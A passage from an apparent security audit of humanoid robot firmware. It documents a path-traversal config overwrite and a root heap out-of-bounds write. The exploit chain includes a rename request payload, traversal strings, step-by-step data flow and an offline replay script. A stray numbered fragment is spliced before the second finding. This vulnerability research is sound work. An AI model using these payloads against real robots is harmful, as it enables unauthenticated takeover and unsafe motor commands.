   - `{"version":"2"}` (no traversal at all) → silently flips the machine variant from R1 to R1_AIR (or back): overwrites `machinetype` (content "1"↔"2"), `basic_service.json` (machinesect/machinetype/joint-protect arrays) and `basic_motor.json` (motor FPFX parameters differ between `/1` and `/2`). The shipped runtime log shows this is real production behaviour — `module/robot_type_service/robot_type_service.log` records `Set_Robot_Type` with versions `1` and `2` and the lines `robot_type_server.cpp:160` "开始拷贝版本2的源文件: /unitree/module/robot_type_service/robot_type_source_file/2 -> /unitree/robot/basic" / `:176` "成功拷贝…" / `:84` "成功设置version: 2，源文件已更新".

### Taint Trace
```
Source: DDS/WebRTC JSON field "version" (parameter string) — rt/api/robot_type_service/request
  ↓ Set_Robot_Type_Parameter::fromJson            robot_type_server_api.hpp:58   [transformation: JSON string extract]
  ↓ Guard: NONE (no charset/length/shape check)
  ↓ std::string concatenation                     robot_type_server.cpp:163      "/unitree/.../robot_type_source_file" + "/" + version
  ↓ Guard: fs::exists(source)                     robot_type_server.cpp:168      effective: NO (existence only)
  ↓ std::filesystem::path(std::string)            robot_type_server.cpp:168      [no normalisation — ".." survives]
  ↓ Guard: NONE
  → Sink: std::filesystem::copy(source, "/unitree/robot/basic", 0xA)  robot_type_server.cpp:177  EFFECT: IO  verdict: UNVALIDATED
```

### Guard Assessment
| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | `fs::exists(source)` | robot_type_server.cpp:168 | source exists | NO (not a security guard) | only distinguishes "log + return false" from "copy"; any real path passes |
| 2 | `try/catch` in `copyVersionSourceFiles` | :183-185 (LP @0x82e54) | runtime exceptions | YES for availability | converts `filesystem_error` into `code:-1` — no crash |
| 3 | `try/catch` in `Set_Robot_Type` | :103-108 (LP @0x8571c) | runtime exceptions | YES for availability | same |
| 4 | `equivalent(from,to)` inside `fs::copy` | libstdc++.so 0x132b88 | self-copy | PARTIAL | only blocks the exact `from == to` case, not traversal |
| 5 | SDK2 lease | `RegistHandler(..., false)` :24-27 | — | **ABSENT** | 3rd arg = 0 for all four handlers |
| 6 | Authentication | SDK2 `Server`/`ServerStub` | — | **ABSENT** | no token/identity check anywhere in the dispatch chain (`QueueThreadFunction@0xace48` → `std::function::operator()` @0xaceb0) |

### Impact
What the attacker gains (all as root, all unauthenticated, one request each):
1. **Overwrite every machine-config file consumed by the root motion-control daemon.** `/unitree/robot/basic/` holds `basic_service.json`, `basic_motor.json`, `machinetype`, `ver`, `code`, `country`, `bluetooth`, `Hardware`, `rfcode`, `rfpower`. Every one of them can be replaced with the content of any other readable file on the filesystem (basename preserved), or bulk-replaced by pointing at a directory.
2. **Machine-variant hijack / kinematic config swap.** The two shipped variants differ materially, not cosmetically (verified by diffing the shipped source files):
   - `robot_type_source_file/{1,2}/basic_service.json`: `machinetype 1↔2`, and `developerMode.parts` joint counts **waist 3→0, leftarm 7→4, rightarm 7→4, head 2→0**, plus `motorprotection` boolean arrays flipped for the waist.
   - `robot_type_source_file/{1,2}/basic_motor.json`: 64 differing lines — the `motorFPFXParmqmotor`/`motorFPFXParmq` arrays for waist/head drop from `32768.0`/`5215.19…` to `0.0`, and the arm arrays lose their last element.
   Silently flipping these on a walking humanoid changes which joints `basic_service` inits with and zeroes the joint parameters for the waist and head.
3. **SN (`code`) corruption → cloud identity desync.** `robot_state_service` (strings) and `chat_go/util.py:740 get_sn()` and `webrtc_bridge/src/webrtc_dds_bridge/multicast_responder.py:67-77` all read `/unitree/robot/basic/code`. Replacing it desynchronises the MQTT/cloud identity and the LLM `user_id` (operational DoS; the *content* cannot be freely chosen, only sourced from another existing file).
4. **Unbounded filesystem exhaustion** via a self-inclusive recursive copy (`version` = `../../../unitree` / `../../..`), hitting the same `/unitree` filesystem that stores `config_service` calibration data.
5. **Planting of arbitrary readable files** into a 0777 directory under attacker-uncontrolled basenames — a staging primitive for any future same-basename confusion.

**Honest bounds (explicit):**
- The destination is **fixed** (`/unitree/robot/basic`) — this is not an arbitrary-path write.
- The planted basename is **the source file's own basename** — the attacker cannot name the output file.
- **No code-execution consumer was found.** Nothing under `/unitree/robot/basic` is executed or `dlopen`ed. `basic_service`/`motion_switcher_service` parse them as config (virtualized; runtime log `module/basic_service/basic.log` shows graceful `"basic read json file is error"` handling for the missing-file case).
- **No attacker-content-at-consumer-basename composition exists on this image.** Every remote arbitrary-content write primitive forces a suffix or a random/forced-suffix name: chat_go knowledge `<uid>.md` (config_manager.py:204-211), arm drop `<name>.yaml` (file_sync.py:136), audiohub `<uuid4>.wav` (audio_file_uploader.py:38-48), ConfigServer `<name>@%08d` (robot_state_service GetDataFileName@0x590734), and the present finding's own `/unitree/robot/info/robot_type` (basename `robot_type` — no `/unitree/robot/basic` consumer). So the copy cannot be used to place attacker-authored bytes at a consumed basename.
- The chain is therefore a **downgrade / config-corruption / availability** primitive, not direct RCE.
- **Re-read cadence of the consumed configs (runtime-log evidence, `module/basic_service/basic.log`):** `basic_service` reads `basic_service.json`, `basic_motor.json`, `machinetype` and `g1_peripheral_version` **on every "power on" event, not only at process start** — pid 1207 read them at 2026-07-04 17:00:27, 2026-07-12 14:06:05 and 2026-07-15 19:06:46 within a single 11-day process lifetime (each preceded by `set total status,status:0` / `power on`). No attacker-triggerable on-demand reload was observed. Consequence: a planted config takes effect at the next power-cycle/boot, not instantly.

### Origin
- **Group**: r2-robottype
- **Files**: `/data/lt/audit/unitree/r1/real_unitree_r1_1.4.2/module/robot_type_service/robot_type_api_server` (fns @0x824e0, 0x84ea8, 0x830a8), `.../module/r1_arm_example/lib/libstdc++.so.6.0.34` (@0x132a5c), `.../etc/master_service/service/robot_type_service`
- **Sink catalog reference**: `audit/sinks/r2-robottype.md` — Seed Sinks rows 2-4, Compound Primitives row 1

### Confidence
8 — the handler logic, the concatenation, the `0xA` copy options, and the file→directory-planting branch are all read directly out of the binary (full DWARF line info) and out of the shipped libstdc++; the consumer set is established by an image-wide strings sweep plus shipped runtime logs. 153

156	- **Corrected primitive**: arbitrary-position relative write, 28-byte granularity, index ∈ [−2³¹, 2³¹) (±60 GB window around Bridge+2096), 3 attacker floats (q/tau/kd) + 2 zeros per iteration, count = joint_idx length. # Finding: AUD-r3-aisport-config-oob-heapwrite

## Primitive
Memory Corruption (attacker-controlled heap out-of-bounds WRITE in a root process, driven purely by motion-config YAML content) — composes with AUD-arm-rename-traversal (the `*.yaml` arbitrary write) and AUD-msvc-fmx-broken-crypto (FMX forgeable/transparent) into a fully-remote root code-execution candidate.

## Severity
CRITICAL

## Condition Analysis

### Summary
`r1_controller` (the ai_sport motion controller; root service `ai_sport`, `etc/master_service/service/ai_sport` runs it via `r1_controller.sh` with no user switch) parses **all 32 FMX-encrypted `.yaml` motion configs through one funnel** — `sub_2687E8@r1_controller` (Mixer::LoadFile → yaml-cpp `YAML::Load`, 26 call sites) — and then feeds values from those configs **directly into the motor-command write loop without a single bounds check**. Two verified shapes:

1. **Arbitrary-index OOB write** — `ucontrol::state::StanceCore::update` (r1_controller@0x356588):
   `for (i = 0; i < joint_idx_.size(); ++i) { v18 = joint_idx_[i]; motor_cmds[v18].q = stance_joint_pos_[i]; .dq = 0; .kp = 0; .tau = kp_[i]; .kd = kd_[i]; }`
   (field accessors sub_1D577C/57AC/57DC/580C/583C at fixed offsets in the 28-byte MotorCmd slot) — 3 of the 5 dwords per slot are attacker floats (`q` from `stance_joint_pos:`, `.tau` from `kp:`, `.kd` from `kd:`), where `joint_idx` is the raw `joint_idx:` list from `config/fsm/statics/stance.yaml` (r1_controller@0x355e04 ctor, key string `joint_idx` read into `std::vector<int>` at +240) and `motor_cmds` is the unchecked accessor `sub_27558C = base + 28*idx` (r1_controller@0x27558c). The target buffer is the outgoing `unitree_hg::msg::dds_::LowCmd_` at `Bridge+2092` — a **35-slot** motor array inside the 5984-byte heap-allocated `ucontrol::Bridge` object (operator new(0x1758) at r1_controller@0x1e2fbc). Any `joint_idx` entry outside 0..34 writes 5 dwords (3 attacker-controlled) at `Bridge+2092+28*idx+{q,dq,kp,tau,kd}` — negative indices write backwards into the Bridge object (subscribers, publishers, shared_ptrs at +4240..+5960), indices ≳140 write past the end of the heap chunk into adjacent allocations. The identical pattern exists in the KeepCore/MoveTo-style update at r1_controller@0x3477b4 (`motor index = vector_at(a1+208,i)` from the config's `client_joint_idx`/`action_joint_idx` lists, e.g. `config/fsm/statics/keep.yaml`).

2. **Linear heap overflow via loop bound** — `ucontrol::state::DampingCore::update` (r1_controller@0x34e440):
   `for (i = 0; i < kds_.size(); ++i) { motor_cmd[i].q = 0; .dq = 0; .kp = 0; .tau = 0; .kd = kds_[i]; }`
   The loop bound is the **length of the `kds:` list in `config/fsm/statics/damping.yaml`** (loaded in `DampingCore::enter` r1_controller@0x34e1c4 — `node["kds"]` → `std::vector<float>` at +160). The shipped file has 29 entries; an attacker-supplied `kds: [<N floats>]` with N > 35 writes `N-35` slots × 28 bytes past the 35-slot array — a linear heap overflow with one attacker-controlled float (`kd`) every 28 bytes amid zero dwords, repeated at control-loop rate in the root process.

Both write paths terminate in `ucontrol::Bridge::publish_low_cmd` (r1_controller@0x25f7e8), which `memcpy`s the (now corrupted) 0x3EC-byte LowCmd and publishes it on `rt/lowcmd` — so the corrupted values also reach the low-level motor daemon (physical-safety impact independent of the memory corruption).

**Reachability of the config content is total**: `unitree::security::Mixer::Load` (verified in the identical statically-linked library at file_mixer@0x36a78) **passes non-FMX input through verbatim** (`std::string::operator=(a3, a2)` when the `FMX\x01` magic, the `size==header-len` check, or the MD5-prefix check fails — the loader at r1_controller@0x2687e8 ignores the return code), so the attacker does not even need to forge FMX — **plaintext YAML is parsed as-is**. Even if the Virbox-wrapped copy in r1_controller differed, FMX is forgeable offline (AUD-msvc-fmx-broken-crypto: 937-byte Blowfish key derived entirely from the file's own 4-byte seed + shipped constants; round-trip-proven decryptor at audit/decrypted/fmx_decrypt.py). The `.yaml` suffix constraint that blocked earlier chains (correlation.md §2b) is void here: **every ai_sport config is `.yaml`-suffixed**, matching AUD-arm-rename-traversal's arbitrary `*.yaml` destination exactly.

**DampingCore::enter re-reads damping.yaml from disk on every entry into the Damping state** (r1_controller@0x34e1c4), so the Damping variant needs **no service restart** — only an FSM transition into Damping, which is attacker-drivable via the unauthenticated DDS topic `rt/wirelesscontroller` (gamepad key events dispatched through the `state_change_map` tables that live in the very same attacker-controlled YAMLs — the attacker rewrites the maps and white lists in one file) and is also the shipped safety-fallback state on any motion error (e.g. `DanceCore::update` → "Dance safety triggered ... → Damping", r1_controller@0x410d80). The Stance/Keep variants need one r1_controller (re)start — provided by reboot, `RPCServiceSwitch` on `rt/api/robot_state/request` (ai_sport absent from robot_state's ProtectedService list), or the master_service ChildServiceMonitor (ai_sport IS in the decrypted `etc/protect` map → dead protected services are auto-restarted on the 5s poll, grp-bin-003 profile).

### Pre-conditions
- Attacker can publish to DDS domain 0 topics `rt/api/arm/request` + `rt/arm_service_inbound` (any firmware-image holder via shipped `etc/ds/` identity, or remotely through the webrtc_bridge data channel — `rt/api/arm/request` is writer #17 and `rt/arm_service_inbound` writer #8 of the runtime-verified bridge table, correlation.md §3).
- One registered custom action as the rename source (attacker drops it in the same session, AUD-arm-filedrop-unauth).
- For the no-restart Damping variant: ability to publish on `rt/wirelesscontroller` (bridge writer #2 — fully remote) or simply wait for any natural Damping entry (robot fall / safety trigger).
- No authentication, no FMX knowledge required (plaintext passthrough), no local presence.

### Data Flow
1. Attacker drops a polyglot-free plain YAML custom action via `rt/arm_service_inbound` (api 1002/1003) into the 0777 `/unitree/etc/r1_arm_example`.
2. Attacker publishes `rt/api/arm/request` api_id 7109 `{"pre_name":"pwn","new_name":"/unitree/module/ai_sport/config/fsm/statics/damping"}` (absolute form discards the base; the relative form needs 2 `../` hops, both verified in AUD-arm-rename-traversal) → `os.rename` as root places the attacker's bytes at `/unitree/module/ai_sport/config/fsm/statics/damping.yaml` (0666 file in a 0777 tree; the FMX original is silently overwritten — move semantics).
3. Attacker triggers a transition into the Damping state — e.g. `rt/wirelesscontroller` key sequence per the (also attacker-controlled) `state_change_map`, or any motion safety failure (the shipped FSM funnels errors into Damping).
   Application: `DampingCore::enter` (r1_controller@0x34e1c4) re-reads damping.yaml → `Mixer::LoadFile` passes the plaintext through → yaml-cpp parses `kds: [<N>]`.
4. On the next control tick `DampingCore::update` (r1_controller@0x34e440) runs the loop with bound N → heap OOB write past the 35-slot motor array inside the root process → heap corruption (RIP-control-grade primitive with grooming; the process performs continuous DDS/onnxruntime allocations) and/or deterministic crash.
5. Independent of weaponization, the same write corrupts the published LowCmd → attacker-chosen `kd` gains are applied to the real motors on `rt/lowcmd`.

### Taint Trace
```
Source: file content of /unitree/module/ai_sport/config/fsm/statics/damping.yaml (or stance.yaml / keep.yaml / any fsm config)
  — written by AUD-arm-rename-traversal api 7109 (root os.rename, .yaml destination matches ai_sport config suffix)
  ↓ Mixer::LoadFile (r1_controller@0x2687e8 → 0x5d7484/Virbox stub 0xE2640; semantics verified at file_mixer@0x363fc→0x36a78)
    Guard: FMX magic/len/MD5 checks — effective: NO — non-FMX input passes through VERBATIM (a3 = a2), return code ignored by caller
  ↓ YAML::Load (r1_controller@0x5b432c/0x5b44d0, vendored yaml-cpp /unitree/project/third/yaml-cpp)
  ↓ DampingCore::enter r1_controller@0x34e1c4: node["kds"] → std::vector<float> (sub_350E58 → sub_351438) — no length cap
    (StanceCore ctor r1_controller@0x355e04: node["joint_idx"] → std::vector<int>; KeepCore: client_joint_idx/action_joint_idx)
  → Sink: DampingCore::update r1_controller@0x34e440: motor_cmd[i] = …kds_[i] for i < kds_.size()
          via sub_26F6D8→sub_27558C = base + 28*i, ZERO bounds checks, i unbounded from config
          (StanceCore::update r1_controller@0x356588: base + 28*joint_idx_[i] with joint_idx_[i] arbitrary int)
  → EFFECT: STATE/EXEC-grade memory corruption in ROOT r1_controller + publication of corrupted LowCmd on rt/lowcmd
Vulnerability class: Memory Corruption (heap OOB write) via configuration injection
```

### Guard Assessment
| # | Guard | Location | What It Checks | Effective? | Why/Why Not |
|---|-------|----------|---------------|------------|-------------|
| 1 | FMX "encryption" | Mixer::Load file_mixer@0x36a78 | magic + len + MD5 prefix | NO | non-FMX content passes through verbatim; FMX itself forgeable (AUD-msvc-fmx-broken-crypto) |
| 2 | yaml-cpp type checks | TypedBadConversion on wrong types | scalar types | NO (for this bug) | `kds`/`joint_idx` are legitimately typed lists of any length/value |
| 3 | joint-index sanity | absent | — | NONE | no bounds check anywhere between YAML vector and `base+28*idx` (r1_controller@0x27558c is raw arithmetic) |
| 4 | motor array bound 35 | IDL fixed array (LowCmd_ 1004B) | — | NONE at the write site | only the DDS serialization is fixed-size; the write happens before it |
| 5 | FSM white lists | set_fsm_white_list in same YAMLs | state transitions | NO | attacker rewrites them in the same poisoned file |
| 6 | DDS auth | etc/cyclonedds.xml | participant auth only | NO | shipped identity / WebRTC bridge (E9-auth, correlation §3) |

### Impact
- **Root heap out-of-bounds write** with per-iteration control of index (Stance/Keep shapes, 3 of 5 dwords attacker floats) or length+value (Damping shape, 1 controlled dword per 28-byte slot): 28-byte stride, repeating at control-loop rate. The Bridge object (5984B heap alloc) hosts DDS channel objects and shared_ptrs that are corrupted in-object; larger indices reach adjacent heap chunks. Standard-grooming RIP control in a root process (binary is PIE+FullRELRO+canary per toolchain default, but heap corruption bypasses canaries; no exec imports — weaponization terminates in control-flow hijack, e.g. overwriting a vtable pointer of the many heap-resident polymorphic objects).
- **Physical safety**: even unweaponized, the corrupted `kd`/`q` values are published on `rt/lowcmd` to the motor daemon — attacker-chosen gains/positions on a 35-joint humanoid, and the poisoned white lists remove the FSM's safety gating.
- **Crash/DoS**: any bad index kills the root service; master_service restarts it (protect map) up to MaxProtectTimes=30 — remote crash-loop.
- Limitation: requires one file-write into an ai_sport config (provided by AUD-arm-rename-traversal, fully remote via webrtc_bridge) and — for the Stance/Keep shapes only — one service restart; the Damping shape needs only a state transition (no restart).

### Origin
- **Group**: r3-r1controller (ai_sport r1_controller)
- **Files/addresses**: module/ai_sport/bin/r1_controller (StanceCore::update@0x356588, ctor@0x355e04; DampingCore::enter@0x34e1c4, update@0x34e440; Keep-style update@0x3477b4; motor accessor@0x27558c; publish_low_cmd@0x25f7e8; config funnel@0x2687e8); module/ai_sport/lib/file_mixer (Mixer::Load@0x36a78, LoadFile@0x363fc, Blowfish::Decrypt@0x3a5d4); config/fsm/statics/{stance,keep,damping}.yaml (decrypted reference in audit/decrypted/ai_sport/fsm/statics/)
- **Sink catalog reference**: audit-0820/sinks/r3-r1controller.md rows 1-4

### Confidence
9 — write loops fully decompiled at both sites; index/loop-bound origin traced to specific YAML keys in specific shipped config files; the 35-slot bound verified structurally (LowCmd_ 1004B = 28*35+44 consumed by fixed loops 0..34 in the pack converters r1_controller@0x260080/@0x25fd70, contrasting with the unbounded config-driven sites); plaintext-passthrough verified from the identical Mixer library in file_mixer with the one honest caveat that r1_controller's own copy is Virbox-wrapped (falsifier: drop a plaintext YAML as real_eth0.yaml on a live unit — and if it were somehow FMX-strict, the FMX forge makes the chain identical).

## PoC (offline verification of the write semantics)

```python
# Replay of DampingCore::update (r1_controller@0x34e440) and StanceCore::update (@0x356588)
import ctypes
BRIDGE = 5984            # operator new(0x1758) @0x1e2fbc
LOWCMD = 2092            # Bridge+2092 outgoing LowCmd_
NSLOT  = 35              # fixed loops elsewhere use 0..34 (@0x260080, @0x25fd70)
STRIDE = 28              # sub_27558C: base + 28*idx

def damping_update(kds):                      # poisoned damping.yaml: kds: [N floats]
    buf = ctypes.create_string_buffer(BRIDGE)
    base = LOWCMD
    for i in range(len(kds)):                 # loop bound = len(kds) — attacker list length
        off = base + STRIDE*i                 # NO bounds check (sub_26f6d8 -> sub_27558c)
        if off+24 > BRIDGE:                   # what the real code does NOT check
            pass                              # (real code writes anyway -> heap OOB)
        for f, delta in ((0,4),(0,8),(0,12),(0,16),(kds[i],20)):
            ctypes.memmove(ctypes.byref(buf, off+delta), ctypes.byref(ctypes.c_float(f)), 4)
    return f"damping: {len(kds)} slots -> last write at Bridge+{LOWCMD+STRIDE*(len(kds)-1)+24} " \
           f"(object ends at +{BRIDGE}) -> {'IN-BOUNDS' if LOWCMD+STRIDE*(len(kds)-1)+24 <= BRIDGE else 'OOB-HEAP-WRITE'}"

def stance_update(joint_idx, pos):            # poisoned stance.yaml: joint_idx: [arbitrary ints]
    worst = max(abs(j) for j in joint_idx)
    return f"stance: index {joint_idx} -> write at Bridge+{LOWCMD}±{STRIDE*worst} (valid slot range 0..{NSLOT-1})"

print(damping_update([0.1]*29))    # shipped config: in-bounds
print(damping_update([9.9]*2000))  # poisoned: ~55KB past the array
print(stance_update([-100, 999999], [1.0, 2.0]))
```

Expected: the shipped 29-entry `kds` stays in-bounds; `kds` of 2000 entries reports OOB at Bridge+2092+28*1999+24 = +56,288 (object ends at +5,984); `joint_idx` values -100/999999 place writes 2,800 bytes before and ~28MB past the buffer.

## Review: PASSED
- Taint trace verified: yes — DampingCore::update's loop bound is the size of the `kds_` vector at DampingCore+160 (loaded in enter() from YAML key "kds" through the file-load funnel sub_2687E8); the per-index accessor chain sub_26F6D8 → sub_27558C is raw `base + 28*i` with zero checks; StanceCore::update uses `joint_idx_[i]` directly as the index with 3 attacker floats per slot; publish_low_cmd memcpys 0x3EC bytes and publishes.
- Constraints verified: yes — Mixer::Load (file_mixer@0x36a78) assigns the raw input to the output verbatim on BOTH failure paths (non-FMX and MD5-mismatch), return 0; the funnel sub_2687E8 ignores the return and feeds the string to the YAML parse; exactly 26 call sites of the funnel (xref-verified); Bridge = operator new(0x1758).
- Severity confirmed: CRITICAL (near-source-unconditional unauth chain — arm drop + rename are bridge-registered topics and near-source unconditional with the shipped DDS credential; FR-conditional documented honestly)
- Verdict: This finding is real and exploitable.

### Minor corrections (cosmetic; no effect on the verdict)
1. "all 32 FMX-encrypted .yaml motion configs" — 35 `.yaml` files exist under config/ (incl. test/ and trajs/). 2. "LowCmd_ 1004B = 28*35+44" — 28*35+44 = 1024 ≠ 1004; the memcpy size is 0x3EC = 1004 and the 35-slot bound is proven independently (below), so the slip is harmless. 3. "indices ≳140 write past the end of the heap chunk" — array base is Bridge+2096, object size 5984 → i ≥ 139 exits the object.

## Independent Verification
- Source cited: r1_controller@0x356588/0x355e04/0x34e1c4/0x34e440/0x3477b4/0x27558c/0x25f7e8/0x2687e8/0x1e2fbc/0x260080/0x25fd70; file_mixer@0x36a78/0x363fc
- I independently re-read (NOT cited by source): **r1_controller@0x2727B4** — `if (a2 > 0x22) __throw_out_of_range_fmt("array::at: __n (which is %zu) >= _Nm (which is %zu)", a2, 0x23); return sub_27558C(a1, a2);` — the codebase's own `std::array<MotorCmd,35>::at()` (used by the serializer sub_260080 with its hardcoded `i <= 34` loop) proves the array bound is 35 elements of 28-byte stride AND that a safe accessor exists but is not used on the config-driven write sites; **0x1D5E50** (+4 array base) and the field accessors **0x1D577C/0x1D57AC/0x1D57DC/0x1D580C/0x1D583C** (+4/+8/+12/+16/+20 = q/dq/kp/tau/kd, matching the PoC deltas); xrefs to 0x2687E8 (= exactly 26); 0x25F7E8's `memcpy(dest, a2, 0x3EC)`; file_mixer@0x36a78 re-decompiled.
- Independent finding: the 35-slot bound proven structurally (std::array::at _Nm=0x23) rather than by convention; the passthrough branch semantics confirmed at instruction level; runtime corroboration from module/ai_sport/build/humanoid.INFO (`Logger::initFromConfig@153` / `FSM::loadDanceStates@322` log lines) proving the funnel functions are live in production; shipped damping.yaml FMX header (magic + len 0x215 = filesize−20) matches Mixer::Load's size arithmetic; decrypted shipped kds = 29 entries (in-bounds) and stance joint_idx all within 0..34.

## Round-6 Cross-Check (write-vs-read/assert-order re-verification)

Re-audit trigger: the Round-6 auto_test review discovered that the MCF OOB loops (AUD-r6-autotest-fsmdamping-motornum-oob, AUD-r6-autotest-jointctl-cfglen-oob) cannot escape their objects because the per-iteration Eigen vector read follows the q/dq writes and the compiled-in eigen_assert fires first (SIGABRT before any out-of-object write — both downgraded CRITICAL→MEDIUM). This section applies the same write-vs-read/assert-order test to the three r1_controller sites. **Result: the containment does NOT transfer to r1_controller. All three sites write OUTSIDE the overflowed object's allocation with no assert or fault able to fire first. CRITICAL stands.**

### Why the R6 containment rule does not apply here (structural)

In auto_test the motor array AND the Eigen/STL read sources lived in the SAME object (FsmDamping: array@+140, kd header@+1680), so the writes hit the size field at a fixed slot (i=55) before leaving the object. In r1_controller the write target and ALL read sources are in DIFFERENT heap allocations:

- **Write target**: the `ucontrol::Bridge` object — **not** a standalone `new(0x1758)` allocation as this finding originally stated. `sub_1E2FBC@r1_controller@0x1e2fbc` uses two-arg `operator new(0x1758, void*)` = **placement new** (verified in disasm at 0x1e2ff0, `_ZnwmPv`); the real heap allocation is `operator new(5992)` at r1_controller@0x1e2f04 — a `make_shared` chunk: [16B `_Sp_counted_base`][**5976B** Bridge] (object-size correction: 0x1758 = 5976, not 5984). The Bridge is created FIRST in main (sub_1D1B14@0x1d1b14 → sub_1DA4B4@0x1da4b4 → new(5992)); every FSM core is created later and only holds a `shared_ptr<Bridge>` at core+8.
- **Read sources**: the FSM core objects themselves — DampingCore+160 (`kds_` Eigen header: data@+160/rows@+168/cols@+176), StanceCore+160/+184/+208/+240 (std::vectors), KeepCore+160/+184/+208/+232/+256 — all separate heap allocations (StanceCore/KeepCore = `new(0x110)`@0x448f84/0x449180).

No write performed inside the Bridge object can touch any read source; therefore no assert or read-fault can fire before the writes leave the Bridge. eigen_assert IS compiled into r1_controller (sub_34B2D8@0x34b2d8 = `Eigen::DenseCoeffsBase<Matrix<float,-1,1>,1>::operator[]` with live assert `"index >= 0 && index < size()"` @ DenseCoeffsBase.h:0x19A → imported `__assert_fail` → SIGABRT; 10+ assert-string instantiations; no signal handlers installed — signal/bsd_signal imported but never called), but its operands live outside the overflowed object.

### Site 1 — DampingCore::update@0x34e440: VERDICT **escape-real** (CRITICAL stands)

Per iteration: 4 constant-zero writes (q/dq/kp/tau at slot+4/8/12/16) → asserted read `kds_[i]` (sub_34B2D8 re-reads rows@DampingCore+168/cols@+176, then data[i]) → kd write (slot+20, attacker float). The asserted read source is in the DampingCore object — unreachable by the writes while they are inside the Bridge.

- First OOB write: **i=138** (tau zero at Bridge+5976 = exactly the 5992-byte chunk end; the kd attacker float at Bridge+5980 lands on the **adjacent chunk's malloc size field, low 32 bits**). i ≥ 139 fully outside the allocation.
- Iterations 0..137 cannot assert or fault: the loop's only reads (bound, assert check, data[i]) come from the DampingCore object and the kds heap buffer — none in the write path. i=35..137 silently corrupt the Bridge's own LowState (+3096), subscribers/publishers (+4240..+5664), watchdog (+5696), strings/flags (+5720..+5976); concurrent DDS/watchdog threads racing on those fields are a probabilistic crash source, not a structural containment.
- The assert can fire only if the marching writes reach DampingCore+160..184 — at Bridge+Δ, Δ = heap distance to a later-allocated object (Δ > 5992, layout-dependent). That happens at i ≈ Δ/28 ≫ 138, i.e. only AFTER (i−138) slots × 28 bytes have already been written outside the chunk. If the DampingCore lands below the Bridge (freed-hole reuse) the loop NEVER reaches it — no assert at all.
- Post-loop: publish_low_cmd@0x25f7e8 memcpys the in-object LowCmd (CRC recomputed after the writes — corrupted kd publishes cleanly) but dereferences the publish-writer objects at Bridge+5296/+5312 — slot 114's writes fully overwrite the +5296 object (12 zero bytes + the kd attacker float) once N ≥ 115, slot 115's overwrite the +5312 object (bytes 4..16) once N ≥ 116 → likely post-loop SIGSEGV. Practical shape: OOB writes complete → crash → master_service protect-map restart → attacker retries with a new N (config re-read on every Damping entry). N (YAML list length) is unbounded.
- **Corrected primitive**: linear heap overflow escaping a 5992-byte chunk at i=138, one attacker-controlled dword per 28-byte slot amid zeros, bounded only by the heap top; the in-object span i∈[36,138] is the same intra-object corruption class as the R6 MEDIUMs, but it escalates past the object with no guard.

### Site 2 — StanceCore::update@0x356588: VERDICT **escape-real, stronger than originally claimed** (arbitrary-index; zero asserts in the loop)

Loop bound = `joint_idx_.size()` (std::vector<int>@+240). Per iteration: unchecked reads `joint_idx_[i]` (sub_32B158), `stance_joint_pos_[i]`/`kp_[i]`/`kd_[i]` (sub_33B6FC = `*begin + 4*i`, unchecked), then 5 writes at `Bridge+2096+28*idx`. **LDRSW at 0x356628: the index is SIGN-EXTENDED from int32** — negative indices write backwards through the Bridge object into its own malloc header and preceding chunks; positive indices reach arbitrarily far forward. There is **no Eigen read in this loop at all** — no assert can ever fire; the read sources are StanceCore's own vectors (different allocation). Only faults: unmapped write target (SIGSEGV) or OOB reads if the pos/kp/kd lists are shorter than joint_idx (attacker equalizes lengths → no fault).

- **Corrected primitive**: arbitrary-position relative write, 28-byte granularity, index ∈ [−2³¹, 2³¹) (±60 GB window around Bridge+2096), 3 attacker floats (q/tau/kd) + 2 zeros per iteration, count = joint_idx length. This bypasses the R6 read-order protection entirely — the reviewer's suspicion that an arbitrary-index write evades it is confirmed.

### Site 3 — KeepCore::update@0x3477b4 (ucontrol::state::KeepCore, RTTI @0x8def18): VERDICT **escape-real** (arbitrary index; the single asserted read is structurally in-bounds)

Loop bound = `action_joint_idx.size()` (vector<int>@+208). Per iteration: `client_joint_idx[i]` (+232, unchecked) → read index v18; `action_joint_idx[i]` (+208, unchecked) → **write index v19 (LDRSW sign-extended @0x34786c)**; asserted read `Eigen256[i]` (sub_34B2D8@+256) precedes the writes; writes motor_cmd[v19].q/.dq/.kp/.tau/.kd; tau/kd read from kp/kd lists at arbitrary index v18.

- The one asserted read is indexed by the LOOP COUNTER and bounded by the Eigen's own size — and KeepCore's vtable-slot-0 capture method (sub_3474BC@0x3474bc) **resizes that Eigen to exactly `action_joint_idx.size()`** and fills it with current robot positions read via `motor_state[action_joint_idx[i]]` = Bridge+72+56·idx (sub_34BEC8 — itself an unchecked arbitrary-index OOB READ, 56-byte stride). So whenever the Keep state functions at all, the assert is trivially satisfied and cannot fire. The only assert-firing scenario (capture never ran → empty Eigen → assert at i=0 before any write) means the state does not work — not a containment of a working attack.
- **Corrected primitive**: same arbitrary-index write as Stance (q = captured robot position — attacker-influenced via prior motor commands, not a direct config float as this finding originally implied; tau/kd = attacker floats via arbitrary client_joint_idx read index), plus an arbitrary-index OOB READ whose values are published on rt/lowcmd (weak read oracle).

### Bottom line

| Site | R6 containment applies? | First out-of-object write | Guards before escape | Verdict |
|---|---|---|---|---|
| DampingCore::update@0x34e440 | No (read source in another allocation) | i=138 (Bridge+5976 = chunk end) | none (assert only at layout-dependent i≈Δ/28 ≫ 138, post-escape) | **escape-real, CRITICAL stands** |
| StanceCore::update@0x356588 | No (no Eigen reads at all) | i=0 with any joint_idx ∉ [0,34] (sign-extended, backwards allowed) | none whatsoever | **escape-real, strongest site** |
| KeepCore::update@0x3477b4 | No (asserted read structurally in-bounds: capture sizes Eigen to loop bound) | i=0 with any action_joint_idx ∉ [0,34] (sign-extended) | none (assert fires only if state never captured) | **escape-real** |

Minor numeric corrections to the original finding: Bridge object is 5976B (0x1758) inside a 5992B make_shared chunk (operator new(5992)@0x1e2f04; the cited new(0x1758)@0x1e2fbc is placement new); first OOB byte is slot 138's tau (i=139 is the first fully-OOB slot); Stance/Keep write indices are sign-extended (negative indices valid — the "indices ≳140" phrasing undersold the backward reach); KeepCore's q source is the captured pose, not a YAML float.
